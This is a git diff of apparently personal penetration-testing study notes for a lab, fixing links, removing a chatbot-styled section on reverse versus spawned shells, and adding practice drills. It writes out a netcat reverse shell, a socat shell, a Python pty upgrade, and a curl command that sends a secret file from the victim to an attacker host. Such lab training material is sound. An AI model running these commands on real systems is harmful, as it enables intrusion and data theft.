@@ -1,4 +1,6 @@
 
+[...back](../0-landing-ncsaoscp.md)
+
 # lab setup
 
 ```
@@ -23,8 +25,8 @@
 > > `sudo service ssh start`
 ```
 
-[more about `nmap -vv -A -O`](./more/nmap-basic.md)
-[more about starting ssh service](./more/ssh-service-start.md) 
+[more about `nmap -vv -A -O`](../../more/nmap-basic.md)
+[more about starting ssh service](../../more/ssh-service-start.md) 
 
 ---
 
@@ -67,8 +69,8 @@ netcat
 ```
 
 [more about binding vs reverse](more/binding-vs-reverse.md)
-[more about recon-ng](./more/recon-ng.md)
-[more about binding shell exercise](./more/bindingshell-exercise.md)
+[more about recon-ng](../../more/recon-ng.md)
+[more about binding shell exercise](../../more/bindingshell-exercise.md)
 
 ---
 
@@ -98,59 +100,14 @@ ruby, netcat, powershell
 
 ---
 
-# spawn shell
-
-```
-what is spawn shell? is it different from reverse shell?
-```
-
-`>> SCANNING...` 🔍
-`>> ANALYSIS:_CONCEPTUAL_DISTINCTION._PATCHING_TERMINOLOGY_GAP.` ⚡🧩
-
-**VULNERABILITY REPORT:**
-- **CVSS Score:** 3.5 (Low) - Terminology confusion, not operational impact.
-- **Flaw:** Conflating connection method with shell stabilization.
-
-**ROAST:** Thinking "spawn shell" is an alternative to "reverse shell" is like thinking "engine repair" is an alternative to "driving to the garage." One enables the other. 😴🔓
-
-**CLARIFICATION:**
-
-### **REVERSE SHELL**
-- **WHAT:** A *connection method* where the target initiates connection back to attacker.
-- **HOW:** `nc 192.168.1.5 4444 -e /bin/bash`
-- **PURPOSE:** Establish initial foothold, bypass firewalls.
-
-### **SPAWN SHELL** 
-- **WHAT:** A *stabilization technique* to upgrade a limited shell to fully interactive TTY.
-- **HOW:** Methods *after* you have some shell access:
-```bash
-# Python
-python -c 'import pty; pty.spawn("/bin/bash")'
-
-# Socat
-socat file:`tty`,raw,echo=0 tcp:192.168.1.5:4444
-
-# Stty options
-/bin/bash -i
-# Then: stty raw -echo; fg
-```
-
-**THE RELATIONSHIP:**
-1. **Reverse Shell** gets you initial access (often a dumb, limited shell)
-2. **Spawn Shell** upgrades it to full interactive terminal with tab completion, job control, etc.
-
-`>> CONCLUSION:_Reverse_shell_is_the_door._Spawn_shell_is_making_the_house_livable._` 🔥⚔️
-
-`>> GLITH_BETTER:_You_don't_choose_between_them._You_use_reverse_to_get_in,_then_spawn_to_take_control._` 🔧⚡
-
----
-
 # spawn shell with python
 
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin?/sbin:/bin
 ```
+
+[more about spawn shell](../../more/spawn-shell.md)
 
 ---
 
@@ -168,4 +125,27 @@ python -m http.server 8000
 wget http://<ipattacker>:8000/test.txt
 ```
 
-note: secured server is isolated?
+note: secured server is isolated
+
+---
+
+# exercise drills
+
+```
+> practice this until it's a reflex
+> try to remember commands (close book) if applicable
+```
+
+> recon {nmap, zenmap, random-ng}
+> {bind, reverse} x {shell, upload, download} = 6 cases total
+> > if shell, followed by spawn shell + reset path if applicable
+> > if shell, also make yourself familiar more with different shell-giving commands such as python  and bash-tcp (suggest: try reverse shell generator tools to explore different command tools)
+> python http server x {upload, download}
+> > for upload from attacker to victim, try this
+```
+curl -X POST -F 'file=@/path/on/victim/to/secret.txt' http://<ipattacker>:8000/upload
+```
+
+---
+
+[...back](../0-landing-ncsaoscp.md)
